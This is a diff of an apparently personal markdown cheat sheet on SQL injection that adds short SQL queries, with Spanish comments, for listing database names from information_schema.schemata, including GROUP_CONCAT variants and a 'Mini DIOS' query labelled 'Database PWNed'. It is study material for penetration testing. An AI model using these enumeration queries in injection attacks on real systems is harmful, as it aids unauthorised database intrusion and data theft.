@@ -1,10 +1,36 @@
 # SQLi: schema, schemata & DIOS
 
+## Fz3r0 SQLi: `schema` mini bible
+
+````sql
+## Schema Name AKA Databases Names Dump
+select schema_name from information_schema.schemata;
+
+---
+
+## Group Concat Basic Query
+SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
+
+## Limitando a 1 en caso que solo deje arrojar un resultado
+SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata limit 0,1;
+
+---
+
+## Concat Basic Query
+SELECT concat(schema_name) FROM information_schema.schemata;
+
+## Mini DIOS: DB Enum (schema enum)
+SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemata;
+
+---
+````
+
 ## `schema name` from `information schema`
 
 ### Query basic
 
 ````sql
+## Schema Name AKA Databases Names Dump
 select schema_name from information_schema.schemata;
 ````
 
@@ -15,7 +41,11 @@ select schema_name from information_schema.schemata;
 #### Basic
 
 ````sql
+## Group Concat Basic Query
 SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
+
+## Limitando a 1 en caso que solo deje arrojar un resultado
+SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata limit 0,1;
 ````
 
 #### Variantes
@@ -35,6 +65,7 @@ SELECT GROUP_CONCAT('Database PWNed: ',schema_name) FROM information_schema.sche
 #### Basic
 
 ````sql
+## Concat Basic Query
 SELECT concat(schema_name) FROM information_schema.schemata;
 ````
 
